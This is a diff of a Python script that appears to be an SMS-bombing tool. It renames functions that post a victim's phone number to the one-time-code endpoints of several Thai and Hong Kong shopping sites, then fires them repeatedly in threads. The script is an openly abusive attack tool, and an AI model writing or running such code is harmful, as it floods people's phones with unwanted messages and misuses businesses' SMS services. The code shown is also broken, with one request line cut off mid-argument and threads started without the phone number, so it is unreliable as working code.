@@ -65,11 +65,11 @@ def sk8(phone):
     post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})
 print (f"Send number {phone} | Success ✓")
 
-def sk10(phone):
+def sk20(phone):
     post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone":
 print (f"Send number {phone} | Success ✓")
 
-def sk11(phone):
+def sk30(phone):
     post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
 print (f"Send number {phone} | Success ✓")
 
@@ -126,8 +126,8 @@ for i in range(amount):
 	threading.Thread(target=sk6).start()
 	threading.Thread(target=sk7).start()
 	threading.Thread(target=sk8).start()
-	threading.Thread(target=sk10).start()
-	threading.Thread(target=sk11).start()
+	threading.Thread(target=sk20).start()
+	threading.Thread(target=sk30).start()
 	threading.Thread(target=sk12).start()
 	threading.Thread(target=sk13).start()
 	threading.Thread(target=sk14).start()
